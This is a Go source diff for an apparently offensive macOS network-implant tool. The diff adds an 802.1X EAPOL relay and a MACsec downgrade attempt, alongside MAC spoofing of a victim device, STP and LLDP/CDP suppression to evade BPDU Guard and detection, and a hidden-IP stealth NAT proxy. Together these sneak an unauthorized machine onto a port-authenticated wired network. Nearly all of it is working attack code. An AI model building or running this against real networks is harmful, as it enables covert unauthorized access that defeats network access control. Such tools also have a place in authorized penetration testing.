@@ -7,7 +7,9 @@ import (
 	"os/exec"
 	"strings"
 	"sync"
+	"time"
 
+	"github.com/mcrn/goLAN/internal/eapol"
 	"github.com/mcrn/goLAN/internal/stealth"
 )
 
@@ -15,11 +17,16 @@ import (
 type BridgeState int
 
 const (
-	BridgeStateDown          BridgeState = iota
-	BridgeStateCreated                   // bridge created but not fully up
-	BridgeStateUp                        // bridge active and forwarding
-	BridgeStateSniffing                  // bridge up, waiting for target identity
-	BridgeStateStealthActive             // stealth NAT and spoofing applied
+	BridgeStateDown               BridgeState = iota
+	BridgeStateCreated                        // bridge created but not fully up
+	BridgeStateUp                             // bridge active and forwarding
+	BridgeStateSniffing                       // bridge up, waiting for target identity
+	BridgeStateStealthActive                  // stealth NAT and spoofing applied
+	BridgeStateEAPOLDetected                  // 802.1X detected, relay setup pending
+	BridgeStateEAPOLRelaying                  // actively relaying EAPOL auth frames
+	BridgeStateEAPOLAuthenticated             // EAP-Success received, port is open
+	BridgeStateEAPOLFailed                    // EAP-Failure received
+	BridgeStateDowngrading                    // MACsec detected, attempting downgrade
 )
 
 func (s BridgeState) String() string {
@@ -34,6 +41,16 @@ func (s BridgeState) String() string {
 		return "Sniffing..."
 	case BridgeStateStealthActive:
 		return "Stealth Active"
+	case BridgeStateEAPOLDetected:
+		return "802.1X Detected"
+	case BridgeStateEAPOLRelaying:
+		return "802.1X Relaying"
+	case BridgeStateEAPOLAuthenticated:
+		return "802.1X Authenticated"
+	case BridgeStateEAPOLFailed:
+		return "802.1X Failed"
+	case BridgeStateDowngrading:
+		return "MACsec Downgrade"
 	default:
 		return "Unknown"
 	}
@@ -51,6 +68,11 @@ type Bridge struct {
 	targetID       *stealth.TargetIdentity
 	cancelStealth  context.CancelFunc
 	reconLogs      []string
+
+	// 802.1X EAPOL relay state
+	eapolRelay     *eapol.Relay
+	eapolSession   *eapol.AuthSession
+	cancelEAPOL    context.CancelFunc
 }
 
 // BridgeStatus is a snapshot of the bridge state for the TUI.
@@ -62,6 +84,12 @@ type BridgeStatus struct {
 	RawInfo   string // raw output from ifconfig
 	TargetID  *stealth.TargetIdentity
 	ReconLogs []string
+
+	// 802.1X fields
+	EAPOLActive      bool
+	EAPMethod        string
+	EAPOLFramesRelayed int
+	MACsecDetected   bool
 }
 
 // NewBridge creates a macOS kernel bridge between two interfaces.
@@ -92,6 +120,14 @@ func NewBridge(ifaceA, ifaceB string, ignoreMAC string) (*Bridge, error) {
 	// from leaking factory MAC discovery packets to the active switch!
 	_, _ = runCmd("ifconfig", ifaceA, "up")
 
+	// Step 3: Harden the bridge against Layer 2 leaks.
+	// NOTE: STP must be disabled AFTER members are added (addm) — macOS bridge(4)
+	// only accepts per-member STP config on existing members. This is done in onMacFunc.
+
+	// Disable IPv6 forwarding globally to prevent NDP Router Solicitations
+	// and Neighbor Discovery from leaking macOS host identity.
+	_, _ = runCmd("sysctl", "-w", "net.inet6.ip6.forwarding=0")
+
 	// We DELAY bridging them until the MAC is explicitly spoofed!
 	b.state = BridgeStateCreated
 
@@ -110,6 +146,8 @@ func NewBridge(ifaceA, ifaceB string, ignoreMAC string) (*Bridge, error) {
 }
 
 // runStealth asynchronously sniffs the line and configures NAT.
+// After MAC spoof and bridge UP, it probes for 802.1X. If detected, it
+// spins up an EAPOL relay to transparently authenticate the supplicant.
 func (b *Bridge) runStealth(ctx context.Context, ignoreMAC string) {
 	// ifaceA is the Device Port. We sniff here because packets from the
 	// device enter this port before traversing the bridge.
@@ -133,24 +171,36 @@ func (b *Bridge) runStealth(ctx context.Context, ignoreMAC string) {
 		out, err := runCmd("ifconfig", b.ifaceB, "ether", mac.String())
 
 		if err != nil {
-			if strings.Contains(string(out), "Network is down") {
+			if strings.Contains(out, "Network is down") {
 				logFunc("[!] Hardware spoof locked. Safe UP strobe initiated...")
 				runCmd("ifconfig", b.ifaceB, "up")
 				out, err = runCmd("ifconfig", b.ifaceB, "ether", mac.String())
 				if err != nil {
 					logFunc("[+] Bypass active: Hardware firmware locked.")
 					logFunc("[*] Fallback: Relying on Bridge Layer-2 masking.")
+					logFunc("[!] ⚠ Port-security warning: Switch may detect MAC flapping if port-security is enabled.")
 				} else {
 					logFunc("[+] Strobe successful: MAC spoof injected.")
 				}
 			} else {
 				logFunc("[+] Bypass active: Hardware firmware locked.")
 				logFunc("[*] Fallback: Relying on Bridge Layer-2 masking.")
+				logFunc("[!] ⚠ Port-security warning: Switch may detect MAC flapping if port-security is enabled.")
 			}
 		}
 
 		logFunc("[*] Bridging un-authenticated device port safely to switch...")
 		runCmd("ifconfig", b.name, "addm", b.ifaceA, "addm", b.ifaceB)
+
+		// Disable STP on BOTH members — macOS bridges send BPDUs by default,
+		// which triggers BPDU Guard on enterprise switches and instantly shuts the port.
+		// This MUST happen AFTER addm — bridge(4) only accepts per-member config on existing members.
+		runCmd("ifconfig", b.name, "stp", b.ifaceA, "disabled")
+		runCmd("ifconfig", b.name, "stp", b.ifaceB, "disabled")
+
+		// Suppress L2 discovery protocol leaks (LLDP/CDP/STP BPDUs) at the bridge level.
+		// This MUST happen after addm but before the switch port goes UP.
+		stealth.SuppressL2Leaks(b.name)
 
 		logFunc("[*] Powering UP Switch adapter...")
 		runCmd("ifconfig", b.ifaceB, "up")
@@ -171,6 +221,141 @@ func (b *Bridge) runStealth(ctx context.Context, ignoreMAC string) {
 	b.targetID = id
 	b.mu.Unlock()
 
+	// ── 802.1X Detection ──────────────────────────────────────────────────
+	// After the bridge is UP and the switch cable is plugged in, the switch
+	// may initiate 802.1X authentication. We detect this by listening for
+	// EAPOL frames on the switch-facing interface.
+	//
+	// Detection can happen two ways:
+	// 1. The sniffer already saw EAPOL frames during MAC discovery (inline detection)
+	// 2. We actively probe on ifaceB after bridge is UP (post-bridge detection)
+
+	eapolActive := id.EAPOLDetected
+
+	if !eapolActive {
+		// Active probe: listen on ifaceB for EAPOL from the switch.
+		// 45-second timeout accommodates switches with slow MAB fallback timers.
+		logFunc("[802.1X] Probing switch port for 802.1X authentication (45s timeout)...")
+		detector := eapol.NewDetector(b.ifaceB)
+		detectCtx, detectCancel := context.WithTimeout(ctx, 45*time.Second)
+		result, detectErr := detector.Detect(detectCtx, 45*time.Second, logFunc)
+		detectCancel()
+
+		if detectErr == nil && result != nil && result.Detected {
+			eapolActive = true
+			if result.MACsecCapable {
+				logFunc("[MACSEC] ⚠ MACsec capability detected on switch port.")
+			}
+		}
+	}
+
+	if eapolActive {
+		logFunc("[802.1X] ● 802.1X authentication required on this network.")
+		logFunc("[802.1X] Starting EAPOL relay between device and switch...")
+
+		b.mu.Lock()
+		b.state = BridgeStateEAPOLDetected
+		b.mu.Unlock()
+
+		// Run the EAPOL relay, which handles the full authentication lifecycle.
+		b.runEAPOLRelay(ctx, logFunc)
+	}
+
+	// ── NAT Setup ──────────────────────────────────────────────────────────
+	// This runs after 802.1X authentication completes (or immediately if no 802.1X).
+	b.setupNATProxy(id, logFunc)
+}
+
+// runEAPOLRelay manages the 802.1X EAPOL relay lifecycle.
+func (b *Bridge) runEAPOLRelay(ctx context.Context, logFunc func(string)) {
+	b.mu.Lock()
+	session := eapol.NewAuthSession(b.targetID.MAC)
+	b.eapolSession = session
+	b.state = BridgeStateEAPOLRelaying
+	b.mu.Unlock()
+
+	eapolCtx, eapolCancel := context.WithCancel(ctx)
+	b.mu.Lock()
+	b.cancelEAPOL = eapolCancel
+	b.mu.Unlock()
+
+	relay := eapol.NewRelay(b.ifaceA, b.ifaceB, session, logFunc)
+
+	b.mu.Lock()
+	b.eapolRelay = relay
+	b.mu.Unlock()
+
+	// Start the relay in a goroutine (it runs perpetually for re-auth).
+	go func() {
+		if err := relay.Start(eapolCtx); err != nil {
+			logFunc(fmt.Sprintf("[802.1X] EAPOL relay error: %v", err))
+		}
+	}()
+
+	// Wait for the initial authentication result.
+	logFunc("[802.1X] Waiting for EAP authentication to complete...")
+	authResult, err := relay.WaitForAuth(ctx)
+	if err != nil {
+		logFunc(fmt.Sprintf("[802.1X] Authentication wait error: %v", err))
+		b.mu.Lock()
+		b.state = BridgeStateEAPOLFailed
+		b.mu.Unlock()
+		return
+	}
+
+	if authResult.Success {
+		logFunc(fmt.Sprintf("[802.1X] ✓ Authentication successful via %s", authResult.Method))
+		logFunc("[802.1X] Port is now AUTHORIZED. Proceeding to NAT setup.")
+		b.mu.Lock()
+		b.state = BridgeStateEAPOLAuthenticated
+		b.mu.Unlock()
+	} else {
+		logFunc("[802.1X] ✗ Authentication FAILED.")
+
+		// If MACsec was detected and we haven't tried downgrade yet, attempt it.
+		if authResult.MACsecDetected {
+			logFunc("[MACSEC] Attempting MACsec downgrade...")
+			b.mu.Lock()
+			b.state = BridgeStateDowngrading
+			b.mu.Unlock()
+
+			relay.EnableDowngrade()
+
+			// Wait for re-auth attempt after downgrade.
+			logFunc("[MACSEC] Waiting for re-authentication after downgrade...")
+			retryResult, retryErr := relay.WaitForAuth(ctx)
+			if retryErr == nil && retryResult.Success {
+				logFunc("[MACSEC] ✓ Downgrade successful! Authenticated without MACsec.")
+				b.mu.Lock()
+				b.state = BridgeStateEAPOLAuthenticated
+				b.mu.Unlock()
+			} else {
+				logFunc("[MACSEC] ✗ Downgrade failed. Switch requires MACsec — bridging not possible.")
+				b.mu.Lock()
+				b.state = BridgeStateEAPOLFailed
+				b.mu.Unlock()
+				return
+			}
+		} else {
+			logFunc("[802.1X] ✗ Authentication rejected. Check device credentials.")
+			b.mu.Lock()
+			b.state = BridgeStateEAPOLFailed
+			b.mu.Unlock()
+			return
+		}
+	}
+
+	// The relay goroutine continues running to handle re-authentication.
+	logFunc("[802.1X] EAPOL relay remains active for periodic re-authentication.")
+}
+
+// setupNATProxy configures the stealth NAT proxy on the bridge.
+// This is called after 802.1X auth succeeds (or immediately if no 802.1X).
+func (b *Bridge) setupNATProxy(id *stealth.TargetIdentity, logFunc func(string)) {
+	// Strip IPv6 from the bridge interface to prevent NDP leaks.
+	// macOS auto-assigns a link-local IPv6 which triggers Router Solicitation.
+	runCmd("ifconfig", b.name, "inet6", "-autoconf")
+
 	// Generate an orthogonal hidden IP to anchor the NAT proxy without colliding
 	// with the host OS routing table for the Target's assigned DHCP subnet.
 	targetStr := id.IP.String()
@@ -182,8 +367,8 @@ func (b *Bridge) runStealth(ctx context.Context, ignoreMAC string) {
 	} else if strings.HasPrefix(targetStr, "172.") {
 		hiddenIP = "192.168.254.10"
 	}
-	
-	logFunc(fmt.Sprintf("[*] Anchoring orthogonal Steath Proxy IP: %s", hiddenIP))
+
+	logFunc(fmt.Sprintf("[*] Anchoring orthogonal Stealth Proxy IP: %s", hiddenIP))
 	runCmd("ifconfig", b.name, hiddenIP, "netmask", "255.255.255.0", "up")
 
 	logFunc("[*] Activating Stealth NAT proxy on bridge...")
@@ -192,7 +377,7 @@ func (b *Bridge) runStealth(ctx context.Context, ignoreMAC string) {
 		HiddenIP:  hiddenIP,
 		TargetIP:  id.IP.String(),
 	}
-	err = stealth.EnableNAT(rule)
+	err := stealth.EnableNAT(rule)
 	if err != nil {
 		logFunc(fmt.Sprintf("[!] ERROR injecting NAT: %v", err))
 	} else {
@@ -203,6 +388,66 @@ func (b *Bridge) runStealth(ctx context.Context, ignoreMAC string) {
 
 	b.mu.Lock()
 	b.state = BridgeStateStealthActive
+	b.mu.Unlock()
+
+	// Launch a background EAPOL watcher on the switch port. Some switches have
+	// very long MAB fallback timers (60-90s). If 802.1X frames appear AFTER
+	// our initial detection window, we retroactively start the relay.
+	b.mu.Lock()
+	needsWatcher := b.eapolSession == nil
+	b.mu.Unlock()
+	if needsWatcher {
+		go b.backgroundEAPOLWatch(logFunc)
+	}
+}
+
+// backgroundEAPOLWatch monitors the switch port for late-arriving EAPOL frames.
+// This catches switches with long MAB fallback timers that send EAPOL-Request/Identity
+// after our initial detection timeout expired.
+func (b *Bridge) backgroundEAPOLWatch(logFunc func(string)) {
+	// Create a cancellable context tied to the bridge's lifecycle.
+	// When the bridge is destroyed, cancelStealth fires, which cancels this too.
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	// Store the cancel so destroy() can stop the background watcher.
+	b.mu.Lock()
+	origCancel := b.cancelEAPOL
+	b.cancelEAPOL = func() {
+		cancel()
+		if origCancel != nil {
+			origCancel()
+		}
+	}
+	b.mu.Unlock()
+
+	detector := eapol.NewDetector(b.ifaceB)
+	// Long poll — listen for up to 5 minutes for late 802.1X.
+	result, err := detector.Detect(ctx, 5*time.Minute, func(msg string) {
+		// Only log EAPOL-related messages to avoid spamming recon log.
+		if strings.Contains(msg, "EAPOL") || strings.Contains(msg, "802.1X") {
+			logFunc(msg)
+		}
+	})
+
+	if err != nil || result == nil || !result.Detected {
+		return // No late EAPOL — network is not 802.1X
+	}
+
+	// Late EAPOL detected! Start the relay retroactively.
+	logFunc("[802.1X] ⚠ Late EAPOL detected after NAT setup — starting relay retroactively.")
+
+	b.mu.Lock()
+	b.state = BridgeStateEAPOLDetected
+	b.mu.Unlock()
+
+	b.runEAPOLRelay(ctx, logFunc)
+
+	// Re-apply stealth after auth succeeds.
+	b.mu.Lock()
+	if b.state == BridgeStateEAPOLAuthenticated {
+		b.state = BridgeStateStealthActive
+	}
 	b.mu.Unlock()
 }
 
@@ -233,19 +478,32 @@ func (b *Bridge) IfaceB() string {
 // Status returns a snapshot of the bridge state.
 func (b *Bridge) Status() BridgeStatus {
 	b.mu.Lock()
-	defer b.mu.Unlock()
-
+	name := b.name
+	session := b.eapolSession
 	status := BridgeStatus{
-		Name:      b.name,
+		Name:      name,
 		IfaceA:    b.ifaceA,
 		IfaceB:    b.ifaceB,
 		State:     b.state,
 		TargetID:  b.targetID,
 		ReconLogs: append([]string(nil), b.reconLogs...), // copy so UI slice is safe
 	}
+	b.mu.Unlock()
 
-	if b.name != "" {
-		out, err := runCmd("ifconfig", b.name)
+	// Populate 802.1X status from the active session.
+	// Done outside b.mu to avoid nested lock (b.mu → session.mu).
+	if session != nil {
+		snap := session.Snapshot()
+		status.EAPOLActive = snap.State == eapol.StateRelaying || snap.State == eapol.StateAuthenticated
+		status.EAPMethod = string(snap.Method)
+		status.EAPOLFramesRelayed = snap.FramesRelayed
+		status.MACsecDetected = snap.MACsecDetected
+	}
+
+	// Fetch raw ifconfig output outside the lock — this is a blocking shell
+	// call and must not hold b.mu or the relay goroutines stall.
+	if name != "" {
+		out, err := runCmd("ifconfig", name)
 		if err == nil {
 			status.RawInfo = out
 		}
@@ -267,6 +525,9 @@ func (b *Bridge) destroy() error {
 		return nil
 	}
 
+	if b.cancelEAPOL != nil {
+		b.cancelEAPOL()
+	}
 	if b.cancelStealth != nil {
 		b.cancelStealth()
 	}
@@ -296,8 +557,8 @@ func (b *Bridge) destroy() error {
 	return nil
 }
 
-// CleanupStaleBridges finds and destroys any existing bridge interfaces.
-// Useful for recovering from a crashed session.
+// CleanupStaleBridges finds and destroys any existing bridge interfaces
+// and flushes stale pfctl NAT rules. Useful for recovering from a crashed session.
 func CleanupStaleBridges() ([]string, error) {
 	out, err := runCmd("ifconfig", "-l")
 	if err != nil {
@@ -312,6 +573,9 @@ func CleanupStaleBridges() ([]string, error) {
 			}
 		}
 	}
+
+	// Also flush the pfctl anchor to remove stale NAT/firewall rules.
+	_ = stealth.DisableNAT()
 
 	return cleaned, nil
 }
